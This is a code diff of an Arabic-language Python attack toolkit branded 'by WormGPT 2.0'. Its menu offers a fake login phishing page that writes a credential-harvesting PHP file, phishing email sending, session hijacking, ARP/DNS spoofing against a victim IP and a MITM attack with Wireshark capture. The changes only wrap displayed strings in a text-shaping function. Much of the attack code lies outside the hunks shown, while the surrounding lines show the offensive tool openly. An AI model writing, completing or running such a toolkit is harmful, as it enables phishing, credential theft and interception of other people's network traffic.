@@ -13,15 +13,15 @@ def ar(text):
 
 
 def banner():
-    print("""
+    print(ar("""
     ======================================
     |       Advanced Python Toolkit      |
     |          by WormGPT 2.0            |
     ======================================
-    """)
+    """))
 
 def menu():
-    print("""
+    print(ar("""
     اختر نوع الهجوم:
     1. تصيد احتيالي عبر صفحة تسجيل دخول وهمية
     2. إرسال بريد إلكتروني تصيدي
@@ -29,8 +29,8 @@ def menu():
     4. DNS Spoofing (تحويل حركة المرور)
     5. هجوم MITM لاعتراض البيانات
     6. الخروج
-    """)
-    return input("أدخل خيارك: ")
+    """))
+    return input(ar("أدخل خيارك: "))
 
 # دالة لإنشاء صفحة تصيد احتيالي مع تسجيل البيانات
 def create_phishing_page():
@@ -62,14 +62,14 @@ def create_phishing_page():
     with open("harvest_credentials.php", "w") as file:
         file.write(harvest_script)
 
-    print("[*] تم إنشاء صفحة التصيد وجاهزة لتسجيل البيانات!")
+    print(ar("[*] تم إنشاء صفحة التصيد وجاهزة لتسجيل البيانات!"))
 
 # دالة لإرسال بريد تصيدي
 def send_phishing_email():
-    sender_email = input("أدخل بريد المرسل: ")
-    recipient_email = input("أدخل البريد المستهدف: ")
-    subject = input("أدخل موضوع البريد: ")
-    body = input("أدخل نص البريد: ")
+    sender_email = input(ar("أدخل بريد المرسل: "))
+    recipient_email = input(ar("أدخل البريد المستهدف: "))
+    subject = input(ar("أدخل موضوع البريد: "))
+    body = input(ar("أدخل نص البريد: "))
 
     msg = MIMEText(body)
     msg['Subject'] = subject
@@ -87,7 +87,7 @@ def send_phishing_email():
 
 # دالة لاختطاف الجلسات
 def session_hijacking():
-    print("[*] محاولة اختطاف الجلسة... (تجريبي)")
+    print(ar("[*] محاولة اختطاف الجلسة... (تجريبي)"))
 
 # DNS Spoofing باستخدام ARP Spoofing
 def dns_spoofing(target_ip, gateway_ip):
@@ -108,20 +108,20 @@ def dns_spoofing(target_ip, gateway_ip):
             spoof(target_ip, gateway_ip)
             spoof(gateway_ip, target_ip)
     except KeyboardInterrupt:
-        print("[!] تم إيقاف عملية Spoofing")
+        print(ar("[!] تم إيقاف عملية Spoofing"))
 
 # هجوم MITM لاعتراض البيانات باستخدام ARP Spoofing
 def mitm_attack(target_ip, gateway_ip):
-    print("[*] بدأ هجوم MITM...")
+    print(ar("[*] بدأ هجوم MITM..."))
     dns_spoofing(target_ip, gateway_ip)
 
 # دالة لتشغيل أداة Wireshark لاعتراض البيانات (أو أي أداة أخرى)
 def run_wireshark(interface="eth0"):
-    print("[*] تشغيل Wireshark لاعتراض البيانات...")
+    print(ar("[*] تشغيل Wireshark لاعتراض البيانات..."))
     try:
         subprocess.run(["wireshark", "-i", interface])
     except Exception as e:
-        print(f"[!] حدث خطأ: {e}")
+        print(ar("[!] حدث خطأ: ") + str(e))
 
 def main():
     banner()
@@ -134,19 +134,19 @@ def main():
         elif choice == '3':
             session_hijacking()
         elif choice == '4':
-            target_ip = input("أدخل عنوان IP للضحية: ")
-            gateway_ip = input("أدخل عنوان IP للبوابة (Gateway): ")
+            target_ip = input(ar("أدخل عنوان IP للضحية: "))
+            gateway_ip = input(ar("أدخل عنوان IP للبوابة (Gateway): "))
             dns_spoofing(target_ip, gateway_ip)
         elif choice == '5':
             target_ip = input("أدخل عنوان IP للضحية: ")
-            gateway_ip = input("أدخل عنوان IP للبوابة (Gateway): ")
+            gateway_ip = input(ar("أدخل عنوان IP للبوابة (Gateway): "))
             mitm_attack(target_ip, gateway_ip)
             run_wireshark()
         elif choice == '6':
-            print("الخروج...")
+            print(ar("الخروج..."))
             break
         else:
-            print("[!] خيار غير صحيح، حاول مرة أخرى.")
+            print(ar("[!] خيار غير صحيح، حاول مرة أخرى."))
 
 if __name__ == "__main__":
     main()
